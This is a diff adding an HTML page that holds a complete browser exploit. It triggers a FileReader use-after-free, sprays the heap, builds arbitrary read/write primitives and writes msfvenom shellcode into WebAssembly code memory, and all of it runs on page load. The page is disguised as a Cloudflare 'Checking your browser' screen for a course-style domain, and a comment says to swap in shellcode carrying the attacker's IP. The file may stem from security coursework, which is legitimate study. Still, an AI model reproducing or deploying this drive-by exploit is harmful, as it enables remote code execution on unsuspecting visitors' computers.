@@ -1,0 +1,346 @@
+<html>
+    <head>
+        <style type="text/css">
+            body {
+                background: white;
+                color: black;
+            }
+        </style>
+        <script id="worker" type="javascript/worker">
+            self.onmessage = function(e) {
+                console.log("Received message in worker");
+            };
+        </script>
+        <script>
+            let disableLogs = false
+
+            var blob = new Blob([
+                document.querySelector('#worker').textContent
+            ], { type: "text/javascript" })
+
+            var free_worker = new Worker(window.URL.createObjectURL(blob));
+
+            // Shellcode generate by msfvenom. Need to be replaced by something with your IP.
+            let SHELLCODE = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100");
+            if (SHELLCODE.length % 2 != 0)
+                SHELLCODE += "\\u9090";
+            
+            const INLINE_PROPERTIES = 0x0c;
+            const OBJECT_ELEMENTS = 0x08;
+
+            var typed_array_abs_addr = null;
+            
+            let file_reader = null;
+            let SPRAYED_OBJECT = null;
+            let curr = 0, prev = 0;
+            let TYPED_ARRAY;
+            const STRING_SIZE = 120000000;
+            let fd = new File(['A'.repeat(STRING_SIZE)], "data.txt");
+            const VAL1 = 0x37363532;
+            const VAL2 = 0x36353433;
+
+            const ROWS = 256;
+            const COLUMNS = 1024;
+
+
+            function disable_logs() {
+                if(disableLogs){
+                    if(!window.console) window.console = {};
+                    var methods = ["log", "debug", "warn", "info"];
+                    for(var i=0;i<methods.length;i++){
+                        console[methods[i]] = function(){};
+                    }
+                }
+            }
+
+
+            function check_bounds(addr) {
+                if (addr > typed_array_abs_addr && addr < typed_array_abs_addr + STRING_SIZE){
+                    return true;
+                }
+                return false;
+            }
+
+
+            function spray_heap() {
+                SPRAYED_OBJECT = new Array(ROWS);
+                for (let i = 0; i < ROWS; i++) {
+                    SPRAYED_OBJECT[i] = new Array(COLUMNS);
+                }
+            }
+
+
+            function control_heap_content() {
+                for (let i = 0; i < ROWS; i++) {
+                    for (let j = 0; j + 2 < COLUMNS; j+=3) {
+                        SPRAYED_OBJECT[i][j] = {value1: VAL1, value2: VAL2, address: 0x41000000}; // High value on heap address so it doesn't get stored as an SMI
+                        SPRAYED_OBJECT[i][j].address = SPRAYED_OBJECT[i][j];
+                        SPRAYED_OBJECT[i][j+1] = new Array(8);
+                        SPRAYED_OBJECT[i][j+2] = new Uint32Array(32);
+                    }
+                }
+            }
+
+
+            function get_in_memory_value(value) {
+                // SMIs are stored as double values
+                return value*2;
+            }
+
+
+            function find_ta_index() {
+                const start_offset = 0xa00000 / 4;
+                for (let i = start_offset; i + 1 < STRING_SIZE / 4; i++) {
+                    if (TYPED_ARRAY[i] == get_in_memory_value(VAL1) && TYPED_ARRAY[i+1] == get_in_memory_value(VAL2)) {
+                        console.log('Finding pattern successful.');
+                        return i;
+                    }
+                }
+                return null;
+            }
+
+
+            function get_spray_idx(property_index) {
+                var exected_value = 0x3a3a3a3a
+                TYPED_ARRAY[property_index] = get_in_memory_value(exected_value); // We store double the value in memory and check for the actual value cuz SMI
+                for (let i = 0; i < ROWS; i++) {
+                    for (let j = 0; j < COLUMNS; j++) {
+                        try{
+                            if (SPRAYED_OBJECT[i][j].value1 == exected_value) {
+                                console.log('Found sprayed object on the reclaimed memory');
+                                return SPRAYED_OBJECT[i][j];
+                            }
+                        }catch(ex){}
+                    }
+                }
+            }
+
+
+            function get_absolute_ta_address(addr) {
+                return (addr-typed_array_abs_addr)/4;
+            }
+
+
+            function arbitrary_read(addr) {
+                if (check_bounds(addr)) {
+                    return TYPED_ARRAY[get_absolute_ta_address(addr)];
+                }
+
+                return 0;
+            }
+
+
+            function arbitrary_write(addr, value) {
+                if (check_bounds(addr)) {
+                    TYPED_ARRAY[get_absolute_ta_address(addr)] = value;
+                }
+            }
+
+
+            function dereference_address(addr) {
+                // Pointers are incremented by 1 when storing in memory.
+                return addr-1;
+            }
+
+
+            function get_object_details(js_object, required_detail_offset) {
+                return dereference_address(arbitrary_read(js_object + required_detail_offset));
+            }
+
+
+            function get_wasm_executable_address(wasm_function) {
+                let wasm_func_addr = dereference_address(get_address_of(wasm_function));
+                let sfi = dereference_address(read_2_bytes(wasm_func_addr + 12)); // the content is stored at +12
+                let wasm_exported_func_data = dereference_address(read_2_bytes(sfi + 4)); //
+                let wasm_instance = dereference_address(read_2_bytes(wasm_exported_func_data + 8));
+                return read_2_bytes(wasm_instance + 0x74);
+            }
+
+
+            function get_read_write_buffer() {
+                for (let i = 0; i < ROWS; i++) {
+                    for (let j = 0; j + 2 < COLUMNS; j+=3) {
+                        let read_write_buffer_addr = dereference_address(get_address_of(SPRAYED_OBJECT[i][j+2]));
+                        // https://seal9055.com/blog/?p=memory_management&d=browser
+                        // According to the Memory Layout of Common JS Objects, based address could be retrieve by offset 0x0c
+                        let inline_properties_addr = get_object_details(read_write_buffer_addr, INLINE_PROPERTIES);
+                        let elements_addr = get_object_details(read_write_buffer_addr, OBJECT_ELEMENTS);
+
+                        if (check_bounds(inline_properties_addr) && check_bounds(elements_addr)) {
+                            return {
+                                inline_properties_addr: inline_properties_addr,
+                                elements_addr: elements_addr,
+                                ui32_array: SPRAYED_OBJECT[i][j+2],
+                                i:i, j:j
+                            }
+                        }
+                    }
+                }
+            }
+
+
+            var reader_obj = null;
+            var ta_index = null;
+            var read_write_buffer = null;
+
+
+            function get_address_of(leaked_obj) {
+                reader_obj.value1 = leaked_obj;
+                return TYPED_ARRAY[ta_index];
+            }
+
+
+            function read_2_bytes(addr) {
+                let elements_addr_tmp = arbitrary_read(read_write_buffer.elements_addr + 12);
+                let inline_prop_addr_tmp = arbitrary_read(read_write_buffer.inline_properties_addr + 16);
+
+                // update with the address we want to update
+                arbitrary_write(read_write_buffer.elements_addr + 12, addr); 
+                arbitrary_write(read_write_buffer.inline_properties_addr + 16, addr);
+
+                // read the value
+                let val = read_write_buffer.ui32_array[0];
+
+                // revert the addresses
+                arbitrary_write(read_write_buffer.elements_addr + 12, elements_addr_tmp);
+                arbitrary_write(read_write_buffer.inline_properties_addr + 16, inline_prop_addr_tmp);
+
+                return val;
+            }
+
+
+            function write_2_bytes(addr, val) {
+                let tmp1 = arbitrary_read(read_write_buffer.elements_addr + 12);
+                let tmp2 = arbitrary_read(read_write_buffer.inline_properties_addr + 16);
+
+                // update with the address we want to update
+                arbitrary_write(read_write_buffer.elements_addr + 12, addr);
+                arbitrary_write(read_write_buffer.inline_properties_addr + 16, addr);
+
+                // update the value
+                read_write_buffer.ui32_array[0] = val;
+
+                // revert the addresses
+                arbitrary_write(read_write_buffer.elements_addr + 12, tmp1);
+                arbitrary_write(read_write_buffer.inline_properties_addr + 16, tmp2);
+            }
+
+
+            function write_string(addr, value) {
+                for (let i = 0; i < value.length; i += 2) {
+                    write_2_bytes(addr + i*2, value.charCodeAt(i) + value.charCodeAt(i + 1) * 0x10000);
+                }
+            }
+
+
+            function get_arbitrary_read_write_segment() {
+                console.log('Trying to get arbitrary read write segment');
+
+                // try to fill the heap with controlled objects 
+                //garbage_collection();
+                control_heap_content();
+
+                // access the freed region as a Uint32Array to have access to the contiguous memory.
+                TYPED_ARRAY = new Uint32Array(prev);
+
+                console.log('Finding the index in the typed array which is start of sprayed object. Retry exploit if fails.')
+                ta_index = find_ta_index();
+
+                console.log('Getting absolute address of the file reader buffer.');
+                const sprayed_obj_addr = dereference_address(TYPED_ARRAY[ta_index + 2]);
+                typed_array_abs_addr = sprayed_obj_addr - (ta_index-3)*4 
+
+                reader_obj = get_spray_idx(ta_index);
+
+                console.log('Getting the read/write array');
+                read_write_buffer = get_read_write_buffer();
+                console.log('Got arbitrary read write segment');
+            }
+
+            
+            function rce() {
+                console.log('Trying to get arbitrary code execution');
+                var imported_func = {
+                    imports: { imported_func: arg => console.log(arg) }
+                };
+                byte_code = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
+                // byte_code = b'\x00asm\x01\x00\x00\x00\x01\x08\x02`\x01\x7f\x00`\x00\x00\x02\x19\x01\x07imports\rimported_func\x00\x00\x03\x02\x01\x01\x07\x11\x01\rexported_func\x00\x01\n\x08\x01\x06\x00A*\x10\x00\x0b'
+                var wasm_code = new Uint8Array(byte_code);
+                var wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), imported_func);
+
+                let wasm_func = wasm_mod.exports.exported_func;
+                let wasm_executable_addr = get_wasm_executable_address(wasm_func);
+
+                write_string(wasm_executable_addr, SHELLCODE);
+                console.log('Got arbitrary code execution');
+
+                // invoke the shellcode
+                window.setTimeout(wasm_func, 2000);
+            }
+
+            function garbage_collection() {
+                try {
+                    // Allocate a large chunk which will fail and V8 engine will run garbage collection
+                    var gc = new WebAssembly.Memory({initial: 33333});
+                } catch(e) {
+                }
+            }
+
+            function run_exploit() {
+                spray_heap();
+                let onprogress_cnt = 0;
+                curr = 0, prev = 0;
+                file_reader = new FileReader();
+
+                file_reader.onprogress = function(evt) {
+                    garbage_collection();
+                    onprogress_cnt += 1;
+                    prev = curr;
+                    curr = evt.target.result;
+                    console.log('On progress event triggered');
+                }
+
+                file_reader.onloadend = function(evt) {
+                    if (onprogress_cnt >= 2 && prev.byteLength == fd.size) {
+                        console.log("Trying to exploit");
+                        try {
+                            // trigger the FREE and use prev for further exploit
+                            free_worker.postMessage("Free these references", [curr, prev]);
+                        } catch(e) {
+                            get_arbitrary_read_write_segment();
+                            rce();
+                        }
+                    }else{
+                        console.log("Reload to try the exploit again");
+                    }
+                }
+
+                garbage_collection();
+                file_reader.readAsArrayBuffer(fd);
+            }
+
+
+            function exploit() {
+                disable_logs();
+                run_exploit();
+            }
+        </script>
+        
+    </head>
+    <body onload="exploit()">
+        <table width="100%" height="100%" cellpadding="30">
+            <tr>
+                <td align="center" valign="center">
+                <h1>Checking your browser before accessing cmpt733.helix-project.org</h1>
+                <div id="challenge">
+                    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+                    <p>Please allow up to 5 seconds...</p>
+                </div>
+                <div style="margin-top:10px;">
+                    <a href="http://www.cloudflare.com/" target="_blank" style="font-size: 12px;">DDoS protection by CloudFlare</a>
+                </div>
+                </td>
+          </tr>
+        </table>
+    </body>
+</html>
